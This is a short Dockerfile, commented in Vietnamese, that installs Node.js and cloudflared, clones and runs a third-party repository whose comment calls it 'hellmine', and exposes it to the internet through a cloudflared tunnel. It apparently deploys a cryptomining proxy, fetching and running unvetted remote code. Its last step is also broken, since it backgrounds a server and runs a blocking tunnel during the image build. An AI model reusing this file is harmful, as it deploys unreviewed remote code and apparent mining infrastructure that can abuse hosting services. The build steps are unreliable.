FROM ubuntu:latest

# Cập nhật hệ thống và cài đặt các gói cần thiết
RUN apt update && \
    apt upgrade -y && \
    apt install -y \
        ca-certificates \
        git \
        sudo \
        nodejs \
        npm \
        wget \
        curl
    

# Tạo thư mục làm việc và tải hellmine

RUN wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb && apt install ./cloudflared-linux-amd64.deb && git clone https://github.com/Teo4268/Pocxy1.git && cd Pocxy1 && npm install 
RUN cd Pocxy1 && node index.js & cloudflared tunnel --url localhost:10000
